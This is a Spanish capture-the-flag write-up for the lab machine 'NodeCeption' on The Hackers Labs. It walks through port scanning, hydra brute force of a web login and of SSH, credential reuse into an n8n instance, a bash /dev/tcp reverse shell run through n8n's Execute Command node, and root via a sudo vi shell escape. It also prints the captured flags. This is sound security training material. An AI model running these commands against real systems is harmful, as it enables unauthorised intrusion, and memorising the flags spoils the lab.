- Tags: #N8N
# Writeup Template: Maquina `[ NodeCeption ]`

- Tags: #NodeCeption
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.17
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.17 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.17
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.17 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.17 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,5678,8765 192.168.100.17 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
5678/tcp open  rrac?
8765/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.17:8765/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.17:8765/
http://192.168.100.17:8765/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], Email[usuario@maildelctf.com], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[192.168.100.17], Title[Apache2 Ubuntu Default Page: It works]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 8765 192.168.100.17
```

Revisando el codigo fuente tenemos un comentario:
```html
<!-- usuario@maildelctf.com
Espero que hayas cambiado la contraseña como se te indicó.
Recuerda: mínimo 8 caracteres, al menos 1 número y 1 mayúscula.
 -->
```

Tenemos un potencial correo electronico:
```bash
usuario@maildelctf.com
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://192.168.100.17:8765/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/login.php            (Status: 200) [Size: 1723]
/index.html           (Status: 200) [Size: 10833]
```
### Enumeracion Login
```bash
http://192.168.100.17:8765/login.php
```

Despues de intentar varias **payloads** tipicos de **SQLInjection** determinamos que no es vulnerable a inyecciones **SQL**
Ahora intentaremos realizar un ataque de fuerza bruta, baso en el patron que venia en los comentarios
```bash
# Creamos un diccionario
cat /usr/share/wordlists/rockyou.txt | grep -E '^[a-zA-Z0-9]{8,}$' > password.txt
```

Caputuramos la peticion para ver como es que se esta enviando la data con **burpsuite**:
```bash
POST /login.php HTTP/1.1
Host: 192.168.100.17:8765
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://192.168.100.17:8765
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.100.17:8765/login.php
Cookie: rl_session=RudderEncrypt%3AU2FsdGVkX18zhpdJkRxsz5q3aTsuo9%2BaumUd2zyTZwtTSnOhPJQxuGeACQTuGNMDK6rjgt2WT8Y1v%2FIG6SHyddsD2GEiXh5QmlPIOs97QrlzLVsUODMlh3oQlOcY1yZmavT17cyKbe6CCcgcEbRzjw%3D%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX182HMFNa3uYHdgboiUG69%2BpJ9dSi3fFNkQSVwyZGJfGl%2BOqzokl2lpb0fLL%2FDxdWdnbAYDQ%2FUSsuA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19D8ep3UcOlyjhLmR1LIqBLY5M2fj%2BCzFQ%3D; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19Td1u4Qcq1goxFhnV1mG1rbVMmspjWovo%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=usuario@maildelctf.com&password=testing
```

Ahora con **hydra** realizaremos un ataque  de fuerza bruta por **POST** al formulario
```bash
hydra -l usuario@maildelctf.com -P password.txt 192.168.100.17 http-post-form "/login.php:email=^USER^&password=^PASS^:F=Credenciales incorrectas" -f -t 4 -s 8765
```

Tenemos unas posibles llaves de acceso:
```bash
[8765][http-post-form] host: 192.168.100.17   login: usuario@maildelctf.com   password: Password1
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Intentamos loguearnos aqui con estas credenciales:
```bash
http://192.168.100.17:8765/login.php
```

Credenciales usadas:
```bash
login: usuario@maildelctf.com
password: Password1 
```

Una ves ganado acceso al panel en la web vemos lo siguiente:
```bash
## Panel de Acceso

## ✅ Acceso concedido
Las credenciales son válidas.
Ahora puedes iniciar sesión en **n8n** usando este mismo usuario y contraseña.
```

Ahora podemos acceder a la siguietne direccion de **n8**
```bash
http://192.168.100.17:5678/signin?redirect=%252F
```

Tenemos igual un login de inicio de sesion donde reutilizaremos las credenciales para ganar acceso
Tenemso un acceso exitoso con las mismas credenciales, Asiq ue confirmamos que existe reutilizacion de credenciales:
Investigacion de que es **N8N:** **n8n** (pronunciado _"n-eight-n"_) es una plataforma de **automatización de flujos de trabajo** (_workflow automation_) de **código abierto** (licencia **Apache 2.0** + Commons Clause) que permite conectar aplicaciones, APIs y servicios sin necesidad de programación avanzada.
###  **Características Clave**
1. **Nodos (Nodes)**:
    - Bloques preconstruidos para interactuar con apps (Google Sheets, Slack, MySQL, HTTP, etc.).
    - Ejemplo: Un nodo de **Gmail** puede enviar correos automáticamente cuando se dispara un evento.
2. **Editor Visual**:
    - Arrastra y suelta nodos para crear flujos (_workflows_).
    - Ideal para no desarrolladores.
3. **Autohospedado (Self-Hosted)**:
    - Puedes instalarlo en tu propio servidor (Docker, npm, etc.).
    - Alternativa a Zapier/Make (pero con más control).
4. **Triggers & Actions**:
    - Ejecuta workflows manualmente, por horario, o con webhooks.
5. **Opciones de Escalado**:
    - Versión gratuita (open-source) y **n8n.cloud** (servicio gestionado).
### Ejecucion del Ataque
Para ganar acceso al objetivo, Seguimos una guia generada por **IA**:
1. **Abre el editor de n8n**:
    - Accede a tu instancia de n8n (generalmente en `http://localhost:5678` o la URL de tu despliegue).
    - Crea un nuevo workflow o edita uno existente.
2. **Panel izquierdo**:
    - Verás un menú vertical con iconos. Haz clic en el **icono de "+"** (o **"Add Node"** si usas versión en inglés).
3. **Lista completa de nodos**:
    - Se abrirá un panel con **todos los nodos disponibles**, organizados por categorías:
        - **Core**: Nodos básicos (HTTP, Function, Execute Command, etc.).
    **Execute Command** Este nodo permite ejecutar comandos directamente en el servidor donde está instalado n8n.
### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
bash -c 'exec bash -i &>/dev/tcp/IP_Atacante/443 <&1'
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion Users
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
thl:x:1000:1000:THL:/home/thl:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ thl ]`:
Flag del usuario:
```bash
cat user.txt

THL_wdYkVpXlqNaEUhRJfzbtHm
```

Listando los permisos para este usuarios
```bash
sudo -l

User thl may run the following commands on nodeception:
    (ALL) NOPASSWD: /usr/bin/vi
    (ALL : ALL) ALL
```

Ahora si intentamos ejecutarlo para ganar acceso como **root**
```bash
sudo -u root /usr/bin/vi -c ':!/bin/sh' /dev/null
[sudo] password for thl: root
Sorry, try again
```

Necesitamos su contrasena para poder ganar acceso como **root**, Pensando que no podemos transferrir por **ssh** ya que no sabemos la password, 
Tenemos otra alternativa, que es realizar fuerza bruta al usuario por **ssh** ya que esta expuesto:
```bash
hydra -l thl -P password.txt -f -t 4 ssh://192.168.100.17
```

Tenemos su password:
```bash
[22][ssh] host: 192.168.100.17   login: thl   password: basketball
```

Asi que nos aprovechamos de esto para ganar acceso como **root**
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/vi -c ':!/bin/sh' /dev/null
[sudo] password for thl: basketball
```

---

## Evidencia de Compromiso
Flag de **root**
```bash
# cat /root/root.txt
THL_QzXeoMuYRcJtWHabnLKfgDi
```

```bash
# Captura de pantalla o output final
root@nodeception:/home/thl/.n8n# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a realizar fuerza bruta a un panel de login por http
2. Aprendimos a reutilizar contrasenas para el mismo usuario
3. Aprendimos a enumerar **N8N**